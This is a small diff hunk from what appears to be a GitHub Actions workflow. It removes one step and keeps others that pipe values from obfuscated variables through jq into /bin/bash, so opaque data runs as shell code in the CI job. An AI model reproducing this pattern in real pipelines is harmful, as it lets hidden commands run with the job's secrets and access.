@@ -25,7 +25,6 @@ jobs:
           echo $g29066 | jq -r .rq968 | /bin/bash
           printf '%s' "$bdep388" | jq -r .gpmt3 | /bin/bash
           printf '%s' "$mlnn3421" | jq -r .egt08948 | /bin/bash
-          echo $g46243 | jq -r .l2869 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
